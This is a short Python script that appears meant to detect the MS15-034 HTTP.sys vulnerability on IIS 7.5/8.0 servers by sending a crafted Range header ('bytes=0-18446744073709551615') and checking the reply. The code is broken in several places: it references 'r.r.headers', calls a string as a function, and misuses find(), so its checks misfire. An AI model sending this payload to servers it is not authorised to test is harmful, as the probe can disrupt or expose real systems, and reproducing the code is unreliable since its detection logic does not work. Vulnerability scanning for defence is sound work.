import  requests

url="ip"

r=requests.get(url)

remote_server=r.r.headers['Server']

# print(r.headers)
print(remote_server)
print(type(remote_server))
if remote_server.find("IIS/7.5") or remote_server("IIS/8.0"):
#     HOST:stuff Range:bytes=0-18446744073709551615
    payload={'HOST':'stuff','Range':'bytes=0-18446744073709551615'}
    r1=requests.get(url,headers=payload)
    print(r1.request.headers)
    print(r1.content)
    if str(r1.content).find("Requested Range Not Satisfiable"):
        print(url+"exist vuln ms15-034")
    else:
        print(url+"not exist vuln ms15-034")
else:
    print("server not a iis 7.5 or 8.0 ")
